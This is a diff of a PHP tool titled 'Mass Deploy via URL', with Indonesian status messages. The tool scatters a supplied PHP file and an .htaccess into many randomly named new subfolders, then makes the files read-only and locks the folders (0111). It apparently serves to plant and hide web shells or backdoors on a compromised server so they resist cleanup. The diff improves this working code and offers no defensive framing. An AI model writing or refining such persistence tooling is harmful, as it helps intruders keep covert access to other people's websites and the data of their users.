@@ -82,45 +82,58 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 }
             }
 
+            $success[] = "📊 Total folder ditemukan: " . count($all);
+
             shuffle($all);
             $targets = array_slice($all, 0, $limit);
 
-            $usedFolders = [];
-            $success[] = "--- 🚀 Deploy File ---";
+            if (empty($targets)) {
+                $error[] = "❌ Tidak ada subfolder ditemukan untuk deploy.";
+            } else {
+                $usedFolders = [];
+                $success[] = "--- 🚀 Mulai Deploy ---";
 
-            foreach ($targets as $base) {
-                $newFolder = generateRandomFolderName($base, $usedFolders);
-                $usedFolders[] = $newFolder;
+                foreach ($targets as $base) {
+                    $newFolder = generateRandomFolderName($base, $usedFolders);
+                    $usedFolders[] = $newFolder;
 
-                if (!mkdir($newFolder, 0755, true)) {
-                    $error[] = "❌ Gagal buat folder: $newFolder";
-                    continue;
-                }
+                    if (is_dir($newFolder)) {
+                        $error[] = "⚠️ Folder sudah ada dan dilewati: $newFolder";
+                        continue;
+                    }
 
-                $phpPath = $newFolder . '/' . $phpName;
-                $htPath = $newFolder . '/.htaccess';
+                    if (!mkdir($newFolder, 0755, true)) {
+                        $error[] = "❌ Gagal buat folder: $newFolder";
+                        continue;
+                    } else {
+                        $success[] = "📁 Folder dibuat: $newFolder";
+                    }
 
-                $ok1 = file_put_contents($phpPath, $phpContent);
-                $ok2 = file_put_contents($htPath, $htaccessContent);
+                    $phpPath = $newFolder . '/' . $phpName;
+                    $htPath = $newFolder . '/.htaccess';
 
-                if ($ok1 !== false) {
-                    chmod($phpPath, 0444);
-                    $success[] = "✅ PHP deployed: $phpPath";
-                } else {
-                    $error[] = "❌ Gagal deploy PHP ke: $phpPath";
-                }
+                    $ok1 = file_put_contents($phpPath, $phpContent);
+                    $ok2 = file_put_contents($htPath, $htaccessContent);
 
-                if ($ok2 !== false) {
-                    chmod($htPath, 0444);
-                    $success[] = "✅ .htaccess deployed: $htPath";
-                } else {
-                    $error[] = "❌ Gagal deploy .htaccess ke: $htPath";
-                }
+                    if ($ok1 !== false) {
+                        chmod($phpPath, 0444);
+                        $success[] = "✅ PHP: $phpPath (chmod 0444)";
+                    } else {
+                        $error[] = "❌ Gagal tulis PHP: $phpPath";
+                    }
 
-                if (@chmod($newFolder, 0111)) {
-                    $success[] = "🔒 Folder locked (0111): $newFolder";
-                } else {
-                    $error[] = "❌ Gagal chmod 0111 ke: $newFolder";
+                    if ($ok2 !== false) {
+                        chmod($htPath, 0444);
+                        $success[] = "✅ .htaccess: $htPath (chmod 0444)";
+                    } else {
+                        $error[] = "❌ Gagal tulis .htaccess: $htPath";
+                    }
+
+                    if (chmod($newFolder, 0111)) {
+                        $success[] = "🔒 Folder dikunci (0111): $newFolder";
+                    } else {
+                        $error[] = "❌ Gagal chmod 0111: $newFolder";
+                    }
                 }
             }
         }
@@ -130,7 +143,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🚀 Mass Deploy .php & .htaccess via URL</title>
+    <title>🚀 Mass Deploy via URL</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
         input, button { padding: 10px; width: 100%; margin-bottom: 10px; background: #222; border: none; color: #0f0; }
